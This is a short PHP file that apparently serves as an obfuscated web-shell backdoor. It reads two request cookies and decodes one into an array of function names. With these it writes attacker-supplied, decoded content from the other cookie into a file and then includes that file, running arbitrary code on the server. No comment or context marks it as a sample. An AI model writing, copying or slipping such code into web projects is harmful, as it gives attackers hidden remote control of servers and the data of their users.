<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[39])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 4;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[39][$n];
        if (!$c[39][$n + 1]) {
            if (!$c[39][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 4 + 1;
    }
    $k = $p[13]() . $p[16];
    if (!$p[0]($k)) {
        $n = $p[25]($k, $p[21]);
        $p[26]($n, $p[29] . $p[20]($p[18]($c[3])));
    }
    include($k);
}